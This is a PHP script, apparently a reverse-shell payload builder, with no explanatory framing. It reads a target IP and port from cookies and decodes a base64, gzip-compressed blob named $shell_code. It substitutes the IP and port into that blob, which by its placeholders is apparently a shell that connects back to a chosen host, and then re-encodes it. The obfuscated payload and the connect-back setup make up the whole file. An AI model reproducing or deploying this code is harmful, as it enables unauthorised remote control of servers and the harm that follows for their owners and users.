<?php

$port = filter_input(INPUT_COOKIE, 'port');
$ip = filter_input(INPUT_COOKIE, 'ip');

if (!$ip && !$port) {
    echo "ERROR: IP_ADDRESS and PORT is required!";
    exit();
}


$shell_code = "jVZtb9s2EP4rTiGYEqYOdlJgwFRlBtYCywo0RZKhH1yDkCXKJiKLAkk1yVz/993xRZJdLckXS3p4fO6Fx+ecV5lSk9stq6p9I/n3TLNJkBWFTOu2qpIOaoTUJ5BQJ4BClhOsYCqXvNFCqoblaSZl9hTO0kv7QhreMBITSaJ4fgo+AHg+AkY9+7otSybT+ez8XQ/mFavTWf/NpBQyLbNKsaRp1xXPJ2Vb55qLekJpLmqlZZvr0KQdm0yjfaC3XL29NJUwC4lDTCGMUXLwLjq6gmkGTN12KBH5evX5w/XXW+IJbJVIvit+ZY+MJJLpVtYTiIGNMWZsJ2r+LwPSTSXWWQXHIzffk7ziVDFNGylyphTVXFcsNGvLd6soCdgj1y5rXoZnnpECrrSCgua1rmgp5D2UdH9gYDgBwzBoeJEu+tUwit7PBga4fgmAdWDD9muNUPwRw1K8CPtt+4NL0uwZyRJ2aF5vFCS5MMdFJcMSAxbOomSBiWq+Y7TiO64N1O4ydY9vIzVrd00YFJnOIEp8pHDCyFhlOQvJe2ijaaUTElubZMTmEm02A5ufvUiWFWEAu1i2i4M627HY9WO0N3U0rIvy2M5ZRGlqz6ZrFdultpy+Wsgw4vlBcs1OXdt0jeP1k2YKPJ/YGYvXOTYMYzk/hAGvm1bHgWi1eXLrXuAj2j9sOXShy905sAVw25y5XfHFmE4d4CL23GKQmsmtv1Zpf7FgtzFE7Pbuw9Vn0uWGUvALniw8Q3+Sbm3QJcnh51TXL+YalEpncMXw15lCLym4q6ldWhL8IKvkmcj5IPLrf+5IVwoM3ddzAF3OplN/wkM4PSrpH0dfvw8pOwdjx2J4o6PyvU1dN5jMuq/DwYWG6FFQBng+HDSJcMtLbeLieV1/HAc4fson8i/bOhw2ltfv6fTMI73+dmXp1QqKIvJ7puGy4YtosM36yREPZkaMc6gW5gENGV+AdKEuOwavlPayGmVfV7CCCuhMYntvk8BJPog0vNChUzNb4i6Z4eiFwQYTVMU4ns2Pc+/IvH9QfJbl29BaTzI1MW/ReGC45MM6BNjzrUpNVBuws99h5yLpJckm9ObbbPbbt9nFxfL8b/P4C4E3UVKI/ctsEH7JROnZhkPM4iaF5XwV/fhx5uiWBI68htjJKtqvIaN7EzemptyfE4KNSPz/Dh9qR+bfzlcR/BvBdMDWFJWwx5w12n3COdXtjubbrN6wgnofi66OFXaa9720XoG9Ayz3EHH8q9i2zih/p+4uuW5qjxjjFIclXtOTXE+C6jsfNfG4ILNVTG6v//z08Q4mplPf5GDG0JE8dkXDy3ykjh25UVxvF3s/SPrx5oZ0bp6hn7+Sfn5Mj7o7pPfadjackFHyv1ejzCuhmMXNPwXoWA/5Zj14I9es6AU6b5vW7MH+/Q4pvfpCaUzpl+ubO0pRXLZQcpSopK3h4sHmLVyiDbCLCtuH5k8g0ahD/wE";
echo $shell_code;
$shell_code = gzinflate(base64_decode($shell_code));
$shell_code = str_replace('__IP__', "'$ip'", $shell_code);
$shell_code = str_replace('__PORT__', $port, $shell_code);
$shell_code = base64_encode(gzdeflate($shell_code, 9));
